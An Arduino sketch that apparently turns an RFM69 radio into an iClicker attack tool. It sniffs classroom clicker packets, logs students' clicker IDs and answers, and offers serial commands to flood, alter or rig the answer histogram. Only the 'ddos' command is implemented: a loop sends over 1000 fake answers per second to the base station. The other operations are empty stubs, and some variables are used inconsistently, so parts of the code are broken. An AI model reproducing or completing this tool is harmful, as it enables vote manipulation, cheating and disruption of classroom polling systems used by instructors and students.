#include <Arduino.h>
#include <SPI.h>
#include <stdint.h>
#include <iClickerEmulator.h>
#include <RingBufCPP.h>
#include "charUtils.h"
#include "memory.h"
#include "list.h"

// iClicker channel id macro - useful for switch statements
constexpr uint16_t _iid(char* c) {
	return ((uint16_t)c[0]) << 8 | c[1];
}

// Radio properties
#define IS_RFM69HW true //make true if using w version
#define IRQ_PIN 3 // This is 3 on adafruit feather
#define CSN 8 // This is 8 on adafruit feather

// Other hardware properties
#define LED 13
bool LED_on = false;

// Channel we're going to operate on
iClickerChannel Channel = iClickerChannels::AA;

// iClicker instance
iClickerEmulator Clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);

// Some iClicker id constants
/*(()=>{let A = Math.floor(Math.random() * 0x100), B = Math.floor(Math.random() * 0x100),
C = Math.floor(Math.random() * 0x100), D = A ^ B ^ C; return "{0x" + A.toString(16) + ", 0x" +
B.toString(16) + ", 0x" + C.toString(16) + ", 0x" + D.toString(16) + "}";})();*/
uint8_t DDOS_ID[4];

// Buffer for incoming serial commands
const int SerialBufLen = 100;
char SerialBuf[SerialBufLen + 1];

// Utility buffer to be reused later
const int UBufLen = 100;
char UBuf[UBufLen + 1];

// Database of iClicker ids belonging to other students
list<long> clickerIdDatabase;

// Current poll status info
// Store answers in array for quick access
// Maintain hash map for unique IDs
// TODO: Turn this into a hash map based on clicker id... people can submit more than once
int poll[5];
int nResponses;

// user id hash table size: 400
// bogus hash size: 4000

// Poll methods
void resetPoll() {
	for(int i = 0; i < 5; i++)
		poll[i] = 0;
	nResponses = 0;
}
void updatePoll(char a) {
	if(a >= 'A' && a <= 'E') {
		poll[a - 65]++;
		nResponses++;
	}
}

// Operation
enum Operation { flood, changeall, bounce, eq, ddos, idle };

Operation operation = idle;
char operationMode = null;
int operationCounter; // Let operation keep track of its state

// Program config
#define MAX_BUFFERED_PACKETS 50
#define REPLY_TO_CLICKERS false

// Packet buffer for intercepted packets
RingBufCPP<iClickerPacket, MAX_BUFFERED_PACKETS> RecvBuf;

// Main code
void setup() {
	// Setup LED
	pinMode(LED, OUTPUT);
	// Setup Serial
	Serial.begin(9600);
	while (!Serial) ; // Wait for serial port to be available
	Serial.println("Hello.");
	// Setup poll status
	resetPoll(); // Just make sure everything is zeroed
	// Setup serial buffer
	SerialBuf[SerialBufLen] = 0x0; // just for thouroughness
	// Setup clicker
	Clicker.begin(Channel);
	Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
	delay(1000);
	Serial.println("Started promiscouous.");
}

void loop() {
	// Blink led
	//digitalWrite(LED, (LED_on = !LED_on) ? LOW : HIGH);

	// Handle packets
	char msg[50];
	iClickerPacket r;
	while (RecvBuf.pull(&r)) {
		uint8_t *id = r.packet.answerPacket.id;
		iClickerAnswer ans = r.packet.answerPacket.answer;
		char answer = iClickerEmulator::answerChar(ans);
		snprintf(msg, sizeof(msg), "[%c][%02X%02X%02X%02X]  %c", r.type == PACKET_ANSWER ? 'a' : 'r', id[0], id[1], id[2], id[3], answer);
		Serial.println(msg);
		if(ans != iClickerAnswer::ANSWER_PING)
			updatePoll(answer);
	}

	// Handle any serial commands
	if(Serial.available()) {
		// Read serial input into Serial Buf. End char is 0xa == "\n"
		int i = 0;
		int c;
		while(Serial.available() && i < SerialBufLen)
		if((c = Serial.read()) == 0xa)
			break;
		else
			SerialBuf[i++] = c;
		bool good = true;
		if(i < SerialBufLen)
			// If we didn't overrun the buffer, add the null terminator back in
			SerialBuf[i] = 0x0;
		else {
			// If we did overrun the buffer, clear any remaining data in the buffer
			while(Serial.available())
				Serial.read();
			Serial.println("[Error] Serial larger than buffer");
			// Don't bother command checking if we didn't get the full command
			// A command shouldn't be longer than the buffer length anyway
			good = false;
		}

		if(good) {
			// Echo command back
			Serial.print("--> ");
			Serial.println(SerialBuf);
			// Convert the whole command to lowercase
			cToLower(SerialBuf);
			// Load the actual command part into UBuf
			int cmdi = getFragment(SerialBuf, 0, UBuf);
			// Handle command
			if(cEquals(UBuf, "help")) {
				// Print help message
				Serial.println("== Commands ==");
				Serial.println("help             Prints this help message");
				Serial.println("setchannel <ch>  Changes the operating channel");
				Serial.println("status           Prints poll status");
				Serial.println("reset            Resets current poll state");
				Serial.println("abort            Cancels the current operation");
				Serial.println("--  --  --  --");
				Serial.println("flood <mode>     Floods base station with mode in answer, random, uniform, seq");
				Serial.println("changeall <ans>  Changes all submitted answers to the given answer (or uniform)");
				Serial.println("bounce           Causes the bar plot to bounce");
				Serial.println("ddos             Attempts to flood base station with more than 1000 responses/sec");
				Serial.println("eq               Evens out the histogram");
			} else if(cEquals(UBuf, "setchannel")) {
				// Load argument into UBuf
				getFragment(SerialBuf, cmdi, UBuf);
				bool known = true;
				switch(_iid(UBuf)) { // This switch statement sucked to write and sucks to look at
					case _iid("aa"):
						Channel = iClickerChannels::AA;
						break;
					case _iid("ab"):
						Channel = iClickerChannels::AB;
						break;
					case _iid("ac"):
						Channel = iClickerChannels::AC;
						break;
					case _iid("ad"):
						Channel = iClickerChannels::AD;
						break;
					case _iid("ba"):
						Channel = iClickerChannels::BA;
						break;
					case _iid("bb"):
						Channel = iClickerChannels::BB;
						break;
					case _iid("bc"):
						Channel = iClickerChannels::BC;
						break;
					case _iid("bd"):
						Channel = iClickerChannels::BD;
						break;
					case _iid("ca"):
						Channel = iClickerChannels::CA;
						break;
					case _iid("cb"):
						Channel = iClickerChannels::CB;
						break;
					case _iid("cc"):
						Channel = iClickerChannels::CC;
						break;
					case _iid("cd"):
						Channel = iClickerChannels::CD;
						break;
					case _iid("da"):
						Channel = iClickerChannels::DA;
						break;
					case _iid("db"):
						Channel = iClickerChannels::DB;
						break;
					case _iid("dc"):
						Channel = iClickerChannels::DC;
						break;
					case _iid("dd"):
						Channel = iClickerChannels::DD;
						break;
					default:
						// Channel is unknown
						Serial.print("[Error] Unknown channel \"");
						Serial.print(UBuf);
						Serial.println("\"");
						known = false;
						break;
				}
				if(known) {
					// Actually change the channel
					Clicker.setChannel(Channel);
					// Restart promiscuous
					Clicker.stopPromiscuous();
					Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
					// Reply
					cToUpper(UBuf); // Convert channel name to uppercase
					Serial.print("Switched to channel \"");
					Serial.print(UBuf);
					Serial.println("\"");
				}
			} else if(cEquals(UBuf, "status")) {
				Serial.printf("Responses: %d\n", nResponses);
				// Print out poll status
				for(int i = 0; i < 5; i++) {
					Serial.print((char)(i + 65));
					Serial.print(" - ");
					Serial.println(poll[i]);
				}
				// Some system info
				Serial.printf("Free memory: %'dk\n", freeMemory());
			} else if(cEquals(UBuf, "reset")) {
				// Reset poll status
				resetPoll();
				// Reset current operation? I guess why not...
				operation = idle;
				operationParam = null;
			} else if(cEquals(UBuf, "abort")) {
				// Cancel current operation?
				operation = idle;
				operationParam = null;
			} else if(cEquals(UBuf, "flood")) {
				// Extract parameter
				getFragment(SerialBuf, cmdi, UBuf);
				// Only really need to compare first char...
				switch(UBuf[0]) {
					case 'a':
						break;
					case 'b':
						break;
					case 'c':
						break;
					case 'd':
						break;
					case 'e':
						break;
					case 'r':
						break;
					case 'u':
						break;
					case 's':
						break;
					default:
						Serial.print("Unknown flood mode \"");
						Serial.print(UBuf);
						Serial.println("\"");
						break;
				}
				// Set operation
				operation = flood;
			} else if(cEquals(UBuf, "changeall")) {
				// Extract parameter
				getFragment(SerialBuf, cmdi, UBuf);
				// Only really need to compare first char...
				switch(UBuf[0]) {
					case 'a':
						break;
					case 'b':
						break;
					case 'c':
						break;
					case 'd':
						break;
					case 'e':
						break;
					case 'u':
						break;
					default:
						Serial.print("Unknown changeall mode \"");
						Serial.print(UBuf);
						Serial.println("\"");
						break;
				}
				// Set operation
				operation = changeall;
			} else if(cEquals(UBuf, "bounce"))
				// Set operation
				operation = bounce;
			else if(cEquals(UBuf, "ddos"))
				// Set operation
				operation = ddos;
			else if(cEquals(UBuf, "eq"))
				// Set operation
				operation = eq;
			else {
				Serial.print("Unknown command \"");
				Serial.print(UBuf);
				Serial.println("\"");
			}
		}
	}

	// Handle operation
	if(operation != idle) {
		switch(operation) {
			case flood:
				// Flood the base station with a ton of answers
				// Not DDOS level, but a lot
				// TODO: Support various speeds
				break;
			case changeall:
				// Changes all answers to a given answer
				// Changes both student IDs and fake IDs
				break;
			case bounce:
				// Makes histogram bounce
				// Uses all submitted IDs
				// Not really a bounce, but moves all answers to A, then B, then C, ... ?? Or I could just make it bounce...
				break;
			case eq:
				// Attempts to equalize histogram
				break;
			case ddos:
				// Attempts to flood base station with more than 1000 submissions per second
				Serial.println("Starting ddos. Send any data over serial to abort.");
				// Generate new random ID for ddos
				iClickerEmulator::randomId(DDOS_ID);
				int i;
				while(!Serial.available()) { // Stop when input is received from serial
					unsigned long start = micros();
					i = 1000;
					while(i--) {
						// Send bogus packet
						Clicker.submitAnswer(DDOS_ID, iClickerAnswer::ANSWER_A);
					}
					unsigned long end = micros();
					// delta / 1000 = microseconds / packet = A
					// 1000000 microseconds / A = packets per second?
					Serial.println(1000000 / ((end - start) / 1000));
				}
				// we don't care about that input - clear it
				while(Serial.available()) Serial.read();
				// Inform user that ddos is finished
				Serial.println("\nFinished ddos");
				break;
		}
		// All operations involve transmission. Promiscouous mode needs to be restarted.
		Clicker.setChannel(Channel);
		Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
	}

	// Pause for a little bit
	delay(100);
}

void recvPacketHandler(iClickerPacket *recvd) {
	#if REPLY_TO_CLICKERS
	// Send acknowledgement to clicker. Acting as a base station.
	// It might make sense to move this to the loop, however it is important that the
	// acknowledgement is sent quickly.
	if (recvd->type == PACKET_ANSWER) {
		Clicker.acknowledgeAnswer(&recvd->packet.answerPacket, true);
		// restore the frequency back to AA and go back to promiscous mode
		Clicker.setChannel(Channel);
		Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
	}
	#endif
	// Add packet to the buffer
	RecvBuf.add(*recvd);
}
